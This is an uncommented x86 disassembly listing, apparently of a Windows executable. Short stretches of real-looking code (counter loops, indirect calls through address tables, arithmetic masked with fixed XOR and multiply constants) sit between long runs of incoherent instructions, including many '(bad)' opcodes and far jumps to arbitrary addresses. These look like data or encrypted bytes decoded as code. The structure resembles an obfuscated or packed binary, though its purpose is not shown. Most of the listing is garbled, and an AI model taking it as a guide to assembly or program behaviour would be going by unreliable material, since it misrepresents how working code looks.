  40595f:	clc    
  405960:	and    esi,edi
  405962:	jmp    0x1bee:0x182ede44
  405969:	je     0x4059c1
  40596b:	mov    DWORD PTR [esi+0x2620b74f],ecx
  405971:	sar    bh,0xf9
  405974:	ret    
  405975:	out    0x82,eax
  405977:	pop    esi
  405978:	sub    eax,0xc4c3eb52
  40597d:	inc    ebx
  40597e:	enter  0x7130,0xd3
  405982:	xchg   edi,eax
  405983:	dec    edi
  405984:	jle    0x40591e
  405986:	mov    eax,ds:0x950d29c8
  40598b:	inc    ecx
  40598c:	and    BYTE PTR [esi],al
  40598e:	imul   edx,DWORD PTR [eax+0x62],0x1275bc87
  405995:	sub    DWORD PTR [ebp-0x7e857928],ecx
  40599b:	lea    ebp,[ebx+0x45]
  40599e:	xchg   ebp,eax
  40599f:	aaa    
  4059a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a1:	fisub  DWORD PTR [edx]
  4059a3:	xchg   ebx,eax
  4059a4:	push   ds
  4059a5:	ret    
  4059a6:	push   ds
  4059a7:	inc    esi
  4059a8:	add    eax,0x13ff74d5
  4059ad:	mov    bh,0x9d
  4059af:	fnstcw WORD PTR [ecx]
  4059b1:	and    eax,0x91a2c449
  4059b6:	es sahf 
  4059b8:	fisub  DWORD PTR [edx-0x35]
  4059bb:	in     al,dx
  4059bc:	pop    ds
  4059bd:	pusha  
  4059be:	push   edi
  4059bf:	dec    DWORD PTR ds:0xe3b5910a
  4059c5:	xor    bh,ah
  4059c7:	int    0xe6
  4059c9:	pop    ebx
  4059ca:	ss dec ecx
  4059cc:	test   eax,0xa0396f8
  4059d1:	sbb    esp,DWORD PTR [ecx]
  4059d3:	xchg   edx,eax
  4059d4:	mov    esi,0xdd2a4f12
  4059d9:	leave  
  4059da:	and    bh,dh
  4059dc:	sar    DWORD PTR [ecx-0x526e5c11],cl
  4059e2:	sar    DWORD PTR [eax+ebx*4+0x72],cl
  4059e6:	dec    edx
  4059e7:	fist   DWORD PTR [ecx+0xccd1f67]
  4059ed:	dec    ebp
  4059ee:	mov    cl,0x98
  4059f0:	int    0x51
  4059f2:	es pushf 
  4059f4:	jle    0x405a16
  4059f6:	das    
  4059f7:	or     al,0x60
  4059f9:	scas   al,BYTE PTR es:[edi]
  4059fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059fb:	aas    
  4059fc:	test   DWORD PTR [edx+0x5f4bb1c9],0xa5c46490
  405a06:	stos   BYTE PTR es:[edi],al
  405a07:	adc    DWORD PTR [edx+0x6a664f1a],edi
  405a0d:	out    0x29,al
  405a0f:	adc    bl,ah
  405a11:	std    
  405a12:	mov    ecx,DWORD PTR [ebx+0x46]
  405a15:	add    DWORD PTR [ebp+0x6078e83c],esi
  405a1b:	mov    ebp,0xacebdd6
  405a20:	pusha  
  405a21:	gs inc ebp
  405a23:	dec    esi
  405a24:	popf   
  405a25:	jmp    0x944ce3b2
  405a2a:	and    DWORD PTR [eax+0x7f],ebp
  405a2d:	add    DWORD PTR [edi+0x39aaae9b],edi
  405a33:	mov    ecx,0x26403a2e
  405a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a39:	xlat   BYTE PTR ds:[ebx]
  405a3a:	xchg   esp,eax
  405a3b:	pop    ds
  405a3c:	stos   DWORD PTR es:[edi],eax
  405a3d:	sar    DWORD PTR [ebx-0x68],cl
  405a40:	push   0x5fcb9f5f
  405a45:	sub    ebp,DWORD PTR [edi-0x10]
  405a48:	ins    BYTE PTR es:[edi],dx
  405a49:	cmc    
  405a4a:	inc    ecx
  405a4b:	cmp    DWORD PTR [ebx-0xd],ebx
  405a4e:	(bad)  
  405a4f:	ins    BYTE PTR es:[edi],dx
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fc85
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fc71,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fc71
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fc71,edx
  405a8f:	cmp    DWORD PTR ds:0x42fc71,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fc71,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e25b
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fc59,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fc59,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fc59,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e4b7
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fc59
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fc59,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fc51,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e677,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x6dd6624d
  405b88:	sbb    al,0x4c
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bd7
  405b93:	xchg   esi,eax
  405b94:	repnz loopne 0x405b66
  405b97:	inc    edi
  405b98:	sbb    edx,ebp
  405b9a:	(bad)  
  405b9b:	icebp  
  405b9c:	jnp    0x405bd6
  405b9e:	and    al,BYTE PTR [esi+0x13]
  405ba1:	adc    dl,BYTE PTR [eax-0x3a28f865]
  405ba7:	sbb    dh,bl
  405ba9:	pop    ecx
  405baa:	(bad)  
  405bab:	ins    DWORD PTR es:[edi],dx
  405bac:	inc    ecx
  405bad:	dec    ecx
  405bae:	adc    eax,0xd35588db
  405bb3:	xchg   esi,eax
  405bb4:	test   eax,0x7138f0d4
  405bb9:	push   edx
  405bba:	and    al,0x10
  405bbc:	inc    esi
  405bbd:	jmp    0xd502b560
  405bc2:	jle    0x405bad
  405bc4:	addr16 js 0x405b85
  405bc7:	arpl   di,di
  405bc9:	pop    es
  405bca:	push   ebx
  405bcb:	out    0x12,eax
  405bcd:	mov    esp,?
  405bcf:	push   eax
  405bd0:	shr    DWORD PTR [edx+0x73],cl
  405bd3:	adc    al,0xcc
  405bd5:	scas   al,BYTE PTR es:[edi]
  405bd6:	arpl   sp,di
  405bd8:	mov    bl,al
  405bda:	pop    eax
  405bdb:	bound  ebp,QWORD PTR [esi-0x42]
  405bde:	mov    cl,0x9a
  405be0:	xor    bh,bh
  405be2:	test   esi,ecx
  405be4:	push   0xffffff99
  405be6:	push   ebp
  405be7:	dec    ecx
  405be8:	aas    
  405be9:	sbb    ecx,ebp
  405beb:	sbb    BYTE PTR cs:[edx-0x58],al
  405bef:	dec    esp
  405bf0:	fiadd  DWORD PTR [edx]
  405bf2:	(bad)  
  405bf3:	dec    ebp
  405bf4:	inc    ecx
  405bf5:	fisubr WORD PTR [esi+0x19]
  405bf8:	inc    esi
  405bf9:	inc    edx
  405bfa:	cmp    al,0x23
  405bfc:	sbb    cl,bh
  405bfe:	sub    esi,ecx
  405c00:	add    al,0x63
  405c02:	shl    DWORD PTR [eax+0x42],0x75
  405c06:	test   DWORD PTR [ebx],edx
  405c08:	cmp    BYTE PTR [ecx],0x6f
  405c0b:	xor    al,0xbc
  405c0d:	sub    eax,0xb8babad9
  405c12:	(bad)  
  405c14:	adc    al,0xbe
  405c16:	frndint 
  405c18:	add    ebp,DWORD PTR [eax*1-0x728c68c1]
  405c1f:	iret   
  405c20:	imul   ebp,DWORD PTR [edi],0xbd2bafb8
  405c26:	mov    ah,0xba
  405c28:	shr    DWORD PTR [eax],1
  405c2a:	lahf   
  405c2b:	mov    ebx,0x646a9d1f
  405c30:	rcr    ah,cl
  405c32:	and    esi,edx
  405c34:	fwait
  405c35:	jb     0x405cac
  405c37:	sar    eax,0xc2
  405c3a:	fild   QWORD PTR [edx+ebx*8]
  405c3d:	cmp    BYTE PTR [ecx-0x37],ah
  405c40:	pop    ds
  405c41:	mov    ebx,0x94599ba2
  405c46:	inc    ebp
  405c47:	ror    BYTE PTR ds:0xfe8c09b0,cl
  405c4d:	and    esi,DWORD PTR [ecx]
  405c4f:	es (bad) 
  405c51:	retf   0xc275
  405c54:	push   ebp
  405c55:	test   BYTE PTR [eax],ah
  405c57:	mov    cl,0xde
  405c59:	ss xchg esp,eax
  405c5b:	imul   eax
  405c5d:	mov    eax,0xddd4ccf5
  405c62:	sbb    dl,dl
  405c64:	cwde   
  405c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c66:	ret    
  405c67:	mov    al,0x75
  405c69:	rcr    DWORD PTR ss:[esi-0x47],cl
  405c6d:	mov    dl,0xc0
  405c6f:	lds    edi,FWORD PTR ds:0xa3f85fef
  405c75:	(bad)  [ecx+esi*4]
  405c78:	xor    DWORD PTR [esi],eax
  405c7a:	out    dx,eax
  405c7b:	pop    edi
  405c7c:	jl     0x405c77
  405c7e:	adc    al,BYTE PTR [ebp+0x68]
  405c81:	cli    
  405c82:	xlat   BYTE PTR ds:[ebx]
  405c83:	pushf  
  405c84:	dec    edi
  405c85:	std    
  405c86:	inc    ebx
  405c87:	mov    ah,0x4d
  405c89:	ret    0xc7a3
  405c8c:	shl    BYTE PTR [ebx],1
  405c8e:	mov    ecx,0x924acbe
  405c93:	popa   
  405c94:	retf   
  405c95:	cmp    eax,0x645de37a
  405c9a:	pushf  
  405c9b:	sar    DWORD PTR ds:0x36d793c3,cl
  405ca1:	cmp    esi,esi
  405ca3:	inc    ecx
  405ca4:	pop    es
  405ca5:	push   ebx
  405ca6:	xor    edi,DWORD PTR [edx-0x59]
  405ca9:	dec    edi
  405caa:	push   ebx
  405cab:	mov    cl,0x4b
  405cad:	jl     0x405c7c
  405caf:	push   eax
  405cb0:	pop    esp
  405cb1:	ficom  WORD PTR [ebp+ebp*1-0x46]
  405cb5:	xor    BYTE PTR [eax+0x581b238f],dl
  405cbb:	cwde   
  405cbc:	dec    esi
  405cbd:	sbb    DWORD PTR [eax+0x31],esp
  405cc0:	int3   
  405cc1:	mov    ds:0x33344a3c,eax
  405cc6:	gs (bad) 
  405cc8:	or     dl,BYTE PTR [ebx+0x4c0d2f65]
  405cce:	call   0xa4d6f17f
  405cd3:	xor    eax,0x62ef8087
  405cd8:	(bad)  
  405cda:	mov    al,0x7a
  405cdc:	test   al,0xbd
  405cde:	sub    DWORD PTR [edi+edx*2+0x4a],0xffffffa3
  405ce3:	scas   eax,DWORD PTR es:[edi]
  405ce4:	dec    edi
  405ce5:	test   eax,0x51afa517
  405cea:	cmp    BYTE PTR [edx],0x1
  405ced:	push   0x24a3fc7c
  405cf2:	adc    al,0xca
  405cf4:	push   ebp
  405cf5:	nop
  405cf6:	dec    edi
  405cf7:	loopne 0x405cc7
  405cf9:	cli    
  405cfa:	dec    esi
  405cfb:	jnp    0x405d4f
  405cfd:	in     eax,dx
  405cfe:	rcr    BYTE PTR [ebx],cl
  405d00:	retf   
  405d01:	pop    esp
  405d02:	and    al,0xde
  405d04:	push   ebx
  405d05:	bound  esp,QWORD PTR [eax]
  405d07:	lods   eax,DWORD PTR ds:[esi]
  405d08:	(bad)  
  405d0a:	inc    BYTE PTR [eax]
  405d0c:	mov    esi,0x3aba88c2
  405d11:	repz xor al,0x1
  405d14:	lea    edi,[eax-0x73]
  405d17:	and    DWORD PTR [edx+eiz*2+0x40],edi
  405d1b:	ins    BYTE PTR es:[edi],dx
  405d1c:	test   eax,0xc39bfb80
  405d21:	sub    BYTE PTR [ecx],dl
  405d23:	cmp    edx,DWORD PTR [esi-0x611cbf8e]
  405d29:	and    al,0x6a
  405d2b:	fdivr  QWORD PTR [ecx+0x45f44bda]
  405d31:	repz call 0x584c:0xeb83cd37
  405d39:	push   es
  405d3a:	fnsave [ebx]
  405d3c:	xor    esi,0xc1a56771
  405d42:	mov    bh,0x30
  405d44:	icebp  
  405d45:	aad    0xf6
  405d47:	ins    DWORD PTR es:[edi],dx
  405d48:	fild   WORD PTR [esi]
  405d4a:	push   edi
  405d4b:	aad    0x47
  405d4d:	cmp    eax,0x84dd433b
  405d52:	adc    al,0xb0
  405d54:	jmp    0x477c153f
  405d59:	and    bh,BYTE PTR ds:[edi+ebp*4+0x1f]
  405d5e:	add    BYTE PTR [ecx+0x7994359f],al
  405d64:	jl     0x405d16
  405d66:	jge    0x405d7a
  405d68:	loopne 0x405d26
  405d6a:	mov    esp,0xb02122b
  405d6f:	mov    al,0x58
  405d71:	mov    edx,DWORD PTR [esi]
  405d73:	das    
  405d74:	xchg   esi,eax
  405d75:	je     0x405d40
  405d77:	mov    al,ds:0x6c13eef8
  405d7c:	popf   
  405d7d:	popf   
  405d7e:	dec    eax
  405d7f:	ret    
  405d80:	imul   ebp,DWORD PTR [ebp+0x7e],0x1e099c82
  405d87:	xchg   ecx,eax
  405d88:	mov    cl,0xb
  405d8a:	fisttp DWORD PTR [esi-0xe0c6e69]
  405d90:	ret    
  405d91:	test   BYTE PTR [ecx+0x34],ch
  405d94:	mov    DWORD PTR [edx-0x1a],esp
  405d97:	or     DWORD PTR [ebx-0x33a6b1f9],0xbae7fbe9
  405da1:	xchg   DWORD PTR [esi],edi
  405da3:	outs   dx,DWORD PTR ds:[esi]
  405da4:	shl    cx,0x17
  405da8:	pop    esi
  405da9:	adc    eax,0xbae4add9
  405dae:	push   ebp
  405daf:	sbb    DWORD PTR [edi-0xa],edx
  405db2:	imul   esp,DWORD PTR [edx+0x34c923a7],0x50b8b5e4
  405dbc:	xor    cl,dl
  405dbe:	push   esi
  405dbf:	adc    al,0x12
  405dc1:	xor    cl,BYTE PTR ds:0x7c409e17
  405dc7:	xchg   ebx,eax
  405dc8:	dec    esi
  405dc9:	out    dx,al
  405dca:	jmp    0x8350:0xa2359e2
  405dd1:	fimul  DWORD PTR [edx+ebp*1]
  405dd4:	xchg   ebx,eax
  405dd5:	lods   al,BYTE PTR ds:[esi]
  405dd6:	int    0x6c
  405dd8:	pop    ds
  405dd9:	fld    TBYTE PTR [esi-0x7d]
  405ddc:	aas    
  405ddd:	(bad)  
  405dde:	rcr    ebx,1
  405de0:	or     ebp,DWORD PTR [ebx]
  405de2:	pop    ds
  405de3:	pop    edx
  405de4:	mov    ah,0x3a
  405de6:	mov    dl,BYTE PTR [eax+0x28c6c899]
  405dec:	xchg   ecx,eax
  405ded:	push   es
  405dee:	int3   
  405def:	int3   
  405df0:	xchg   esi,eax
  405df1:	push   cs
  405df2:	fstp   st(4)
  405df4:	sbb    ch,BYTE PTR [eax]
  405df6:	outs   dx,DWORD PTR ds:[esi]
  405df7:	(bad)
  405dfb:	mov    bl,0x4c
  405dfd:	dec    eax
  405dfe:	add    DWORD PTR [ebx-0x8],edi
  405e01:	mov    BYTE PTR [eax],bl
  405e03:	add    ecx,DWORD PTR [esi+0x3e]
  405e06:	jnp    0x405e3d
  405e08:	repnz not eax
  405e0b:	xchg   ecx,eax
  405e0c:	in     al,0xbb
  405e0e:	(bad)  
  405e0f:	pusha  
  405e10:	inc    eax
  405e11:	in     al,0x72
  405e13:	inc    eax
  405e14:	pop    ecx
  405e15:	jae    0x405def
  405e17:	sub    bh,ah
  405e19:	and    DWORD PTR [ebx+edx*4],esi
  405e1c:	cld    
  405e1d:	(bad)  
  405e1e:	(bad)  
  405e20:	add    eax,0x36609501
  405e25:	ffree  st(3)
  405e27:	xor    eax,0x7cfa6e9
  405e2c:	test   al,0xbd
  405e2e:	mov    ebp,0x1612644e
  405e33:	xor    al,0xeb
  405e35:	adc    cl,BYTE PTR [ecx-0x4e]
  405e38:	pop    esp
  405e39:	sbb    eax,DWORD PTR ds:[esi]
  405e3c:	mov    cl,ah
  405e3e:	sub    DWORD PTR [edi],esi
  405e40:	(bad)  
  405e41:	fsubp  st(3),st
  405e43:	cmp    eax,0x668bf935
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e68f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e66f,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fc81,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x42
  405ea8:	adc    eax,0x3f3ed904
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405f30
  405eb4:	inc    ebp
  405eb5:	sbb    dl,ch
  405eb7:	add    ebx,DWORD PTR [ebx]
  405eb9:	mov    ecx,0xbbde4707
  405ebe:	inc    ebp
  405ebf:	fidivr DWORD PTR [esp+ecx*8]
  405ec2:	add    dx,WORD PTR [edx+0x60]
  405ec6:	pop    es
  405ec7:	arpl   sp,si
  405ec9:	je     0x405f27
  405ecb:	addr16 mov ds:0x14fa,eax
  405ecf:	rol    esi,0xcb
  405ed2:	lods   eax,DWORD PTR ds:[esi]
  405ed3:	stos   BYTE PTR es:[edi],al
  405ed4:	icebp  
  405ed5:	fidiv  DWORD PTR [eax-0x513ccda4]
  405edb:	repz pop es
  405edd:	iret   
  405ede:	inc    esp
  405edf:	shl    BYTE PTR [esi+edx*8-0x73f8ac],0x8a
  405ee7:	loope  0x405f00
  405ee9:	loopne 0x405ef9
  405eeb:	scas   al,BYTE PTR es:[edi]
  405eec:	adc    eax,0x6c5287e
  405ef1:	es cmp al,0xe7
  405ef4:	arpl   WORD PTR [ecx],bp
  405ef6:	mov    eax,DWORD PTR [edi]
  405ef8:	and    cl,BYTE PTR [esi]
  405efa:	inc    esp
  405efb:	fnstenv [ebx-0x60bf7130]
  405f01:	mov    ebp,0x641ed3fd
  405f06:	ss adc al,bh
  405f09:	inc    edi
  405f0a:	ss dec esp
  405f0c:	pop    ss
  405f0d:	mov    al,0x5
  405f0f:	je     0x405ebe
  405f11:	test   DWORD PTR [edi-0x1e2f2af5],0xf2efe37b
  405f1b:	xchg   edx,eax
  405f1c:	jmp    0x405f62
  405f1e:	lods   al,BYTE PTR ds:[esi]
  405f1f:	rcr    bl,cl
  405f21:	pushaw 
  405f23:	in     al,dx
  405f24:	shl    BYTE PTR [eax],1
  405f26:	adc    DWORD PTR [ebx],eax
  405f28:	xor    al,0x6b
  405f2a:	xchg   esp,eax
  405f2b:	ins    DWORD PTR es:[edi],dx
  405f2c:	loopne 0x405f19
  405f2e:	jo     0x405f70
  405f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f31:	mov    al,0xb9
  405f33:	nop
  405f34:	jbe    0x405f73
  405f36:	push   0xffffff87
  405f38:	adc    dh,bl
  405f3a:	mov    ch,0x8f
  405f3c:	arpl   WORD PTR [esi-0x157d3a7a],ax
  405f42:	jl     0x405f18
  405f44:	das    
  405f45:	mov    eax,0x4eb44788
  405f4a:	lds    esi,FWORD PTR [ecx]
  405f4c:	mov    al,0x85
  405f4e:	bound  ebx,QWORD PTR ds:0x9bdf590
  405f54:	mov    dh,0x45
  405f56:	xchg   BYTE PTR [edi+0x275b5683],dl
  405f5c:	fsubr  QWORD PTR [ecx]
  405f5e:	add    eax,DWORD PTR [edi+0x38]
  405f61:	sbb    eax,0xb17f636
  405f66:	(bad)  
  405f67:	jmp    0x405f43
  405f69:	call   0x3937dc69
  405f6e:	cmp    ebp,DWORD PTR cs:[esi+0x2b5c4b17]
  405f75:	loopne 0x405f2a
  405f77:	cmp    DWORD PTR ds:0x22629653,ecx
  405f7d:	int    0x34
  405f7f:	and    edx,DWORD PTR [esi-0x43c32a56]
  405f85:	xor    edx,DWORD PTR [esi-0x72]
  405f88:	aad    0x40
  405f8a:	pop    eax
  405f8b:	(bad)  
  405f8d:	rol    DWORD PTR ds:0x59e49aa2,0xc3
  405f94:	sbb    ebx,esi
  405f96:	fwait
  405f97:	mov    ecx,0x65d135fc
  405f9c:	shl    bh,cl
  405f9e:	into   
  405f9f:	or     BYTE PTR [esi+0x4b],dh
  405fa2:	ja     0x405f99
  405fa4:	add    edi,DWORD PTR [ecx]
  405fa6:	hlt    
  405fa7:	dec    bp
  405fa9:	xor    al,0xdb
  405fab:	adc    DWORD PTR [edi+0x6d],0x6531ad33
  405fb2:	stos   DWORD PTR es:[edi],eax
  405fb3:	inc    ebx
  405fb4:	fild   QWORD PTR [ebx-0x48]
  405fb7:	xlat   BYTE PTR ds:[ebx]
  405fb8:	not    DWORD PTR [esi+ebx*1+0x13f7cc97]
  405fbf:	xchg   DWORD PTR [eax],ebx
  405fc1:	(bad)  
  405fc3:	sbb    al,0x1
  405fc5:	jae    0x405fee
  405fc7:	cmp    al,0x5b
  405fc9:	mov    DWORD PTR [esp+edx*2+0x51a580f7],esi
  405fd0:	mov    WORD PTR [ecx],ss
  405fd2:	in     eax,dx
  405fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fd4:	(bad)  
  405fd5:	jno    0x406016
  405fd7:	addr16 test al,0x55
  405fda:	mov    edi,DWORD PTR [ebx]
  405fdc:	mov    esp,0x53a84f37
  405fe1:	test   edx,edx
  405fe3:	jmp    0x6574f476
  405fe8:	dec    esp
  405fe9:	dec    ebx
  405fea:	test   BYTE PTR [edi+0x24684d01],0x76
  405ff1:	and    al,0x2b
  405ff3:	pop    edi
  405ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ff5:	popf   
  405ff6:	loopne 0x406062
  405ff8:	(bad)  
  405ff9:	pop    ebp
  405ffa:	pop    edx
  405ffb:	adc    eax,0x17794ca1
  406000:	shr    BYTE PTR [edx+0x59],cl
  406003:	inc    esp
  406004:	pop    ebp
  406005:	dec    edi
  406006:	cmp    eax,0x854eb86f
  40600b:	pop    esi
  40600c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40600d:	out    dx,al
  40600e:	dec    ecx
  40600f:	mov    WORD PTR [esi+eax*2-0x50],?
  406013:	sti    
  406014:	xchg   edi,eax
  406015:	(bad)  
  406016:	pop    ds
  406017:	sub    eax,ebp
  406019:	inc    ebx
  40601a:	xchg   BYTE PTR [eax-0x69],ch
  40601d:	dec    edx
  40601e:	test   DWORD PTR [edx],esp
  406020:	repz inc esp
  406022:	fwait
  406023:	pop    ebp
  406024:	cli    
  406025:	iret   
  406026:	xchg   edi,eax
  406027:	addr16 dec eax
  406029:	bound  ebp,QWORD PTR [edi+0x32ec4c4]
  40602f:	inc    eax
  406030:	jle    0x40607e
  406032:	leave  
  406033:	push   ds
  406034:	rcr    BYTE PTR [ebp+0x6f4f985d],1
  40603a:	pushf  
  40603b:	cwde   
  40603c:	xlat   BYTE PTR ds:[ebx]
  40603e:	sub    eax,0xf23fb2b5
  406043:	jmp    0x866f:0x77d4479d
  40604a:	add    DWORD PTR [ebx-0x2c05d369],ebx
  406050:	stos   DWORD PTR es:[edi],eax
  406051:	jg     0x406019
  406053:	test   eax,0x7f2c8656
  406058:	fadd   DWORD PTR [edi+0x7e]
  40605b:	jecxz  0x406062
  40605d:	pushf  
  40605e:	jb     0x406092
  406060:	add    BYTE PTR [ecx+0x42fd060d],al
  406066:	add    ah,ah
  406068:	or     al,BYTE PTR [eax]
  40606a:	add    BYTE PTR [ecx+0xc458b02],cl
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e098
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fcf6,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fc71,0x42e09c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fc51,0x42e67b
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd02,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fc55,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fc85
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0x2c92c896
  4060dc:	jne    0x406143
  4060de:	ds jo  0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x406106
  4060e6:	and    al,0x81
  4060e8:	push   ecx
  4060e9:	bswap  ebx
  4060eb:	adc    ecx,ebp
  4060ed:	gs push es
  4060ef:	sbb    al,0xfe
  4060f1:	jbe    0x406095
  4060f3:	jne    0x4060c7
  4060f5:	push   ss
  4060f6:	push   ss
  4060f7:	push   cs
  4060f8:	dec    esp
  4060f9:	(bad)  
  4060fa:	jge    0x4060e4
  4060fc:	sti    
  4060fd:	sub    DWORD PTR [esi+esi*4],ebx
  406100:	fstp   QWORD PTR [ecx+0x4c6f007d]
  406106:	ret    
  406107:	out    dx,al
  406108:	aaa    
  406109:	sbb    eax,0x1f9e6af1
  40610e:	test   BYTE PTR [ecx],al
  406110:	and    al,BYTE PTR [ebx+edx*8+0x4a9481ac]
  406117:	xlat   BYTE PTR ds:[ebx]
  406118:	and    edx,0xaf0c0450
  40611e:	xlat   BYTE PTR ds:[ebx]
  40611f:	repz in eax,dx
  406121:	jo     0x406190
  406123:	(bad)  
  406124:	fs jg  0x406198
  406127:	repnz mov ch,0x84
  40612a:	aad    0x19
  40612c:	push   0xffffffc2
  40612e:	pop    ecx
  40612f:	pop    esp
  406130:	jno    0x4060f2
  406132:	inc    eax
  406133:	or     BYTE PTR [ebx+0x30586166],al
  406139:	gs jno 0x4061a3
  40613c:	int3   
  40613d:	mov    bh,0x64
  40613f:	cmp    DWORD PTR [edi+0x10],ecx
  406142:	addr16 jp 0x4061ab
  406145:	adc    DWORD PTR [ecx+0x6744e7fb],esp
  40614b:	cmp    al,0x5b
  40614d:	and    eax,0xaa1c25ee
  406152:	mov    es,WORD PTR ds:0xb55e929c
  406158:	sbb    al,dh
  40615a:	adc    dh,BYTE PTR [ebx+esi*1+0x55]
  40615e:	and    ch,BYTE PTR [ebp+0x3c]
  406161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406162:	dec    ebx
  406163:	enter  0x801d,0xea
  406167:	jmp    0xcf25:0x521aba2d
  40616e:	test   BYTE PTR [edi+0x2b],ah
  406171:	cs stc 
  406173:	inc    eax
  406174:	mov    ch,0xfe
  406176:	or     ax,0x10f8
  40617a:	ss jno 0x406101
  40617d:	mov    al,ds:0x370a6fbf
  406182:	popa   
  406183:	retf   0xd24
